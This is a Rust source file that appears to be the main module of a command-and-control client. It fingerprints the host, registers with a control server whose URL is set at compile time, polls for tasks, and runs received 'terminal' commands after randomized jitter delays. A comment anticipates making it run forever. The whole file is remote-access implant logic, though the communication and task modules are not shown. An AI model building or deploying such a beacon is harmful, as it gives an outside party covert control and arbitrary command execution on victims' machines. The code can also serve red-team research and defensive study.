use std::{
    thread,
    time,
};
//use std::borrow::Borrow;
use models::Task;
use rand::Rng;


mod communication;
mod utils;
mod models;
mod tasks;

// Note that URL is set by environment variable during compilation
const URL: &'static str = env!("CONTROL_SERVER_URL");
const POLL_SLEEP: time::Duration = time::Duration::from_secs(5);
const TERMINAL_CMD: &'static str = "terminal";


/// Fetches commands from the control server and runs them
async fn call_home(token: &String) {
    let tasks: Vec<Task> = match communication::get_commands(token, URL).await {
        Ok(val) => val,
        Err(_) => Vec::new(),
    };
    for t in tasks {
        let wait = rand::thread_rng().gen_range(t.min_delay, t.max_delay);
        thread::sleep(time::Duration::from_millis(wait as u64));

        // Add more command types here when supported by server and implemented in client
        if t.name == TERMINAL_CMD {
            tasks::terminal_command(t.data);
        }
    }
}

/// Initializes the client by sending ID characteristics to the control server.
/// Will poll the server until a authorization token is received
///
/// # Returns
/// The clients authorization token to be used on further requests to the control server.
async fn initialise_client() -> String {
    let mut token: String;
    loop {
        let id = utils::get_host_identify();
        token = match communication::send_identity(id, URL).await {
            Ok(val) => val,
            Err(_) => String::from("")
        };

        if token != String::from("") {
            break;
        } else if cfg!(debug_assertions) {
            println!("Failed initialize");
        }
        thread::sleep(POLL_SLEEP);
    }
    #[cfg(debug_assertions)]
    println!("Client initialised");
    return token;
}

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    let token: String = initialise_client().await;
    loop {
        call_home(&token).await;
        thread::sleep(POLL_SLEEP);

        // Remove break when the client is supposed to run forever
        break;
    }
    Ok(())
}
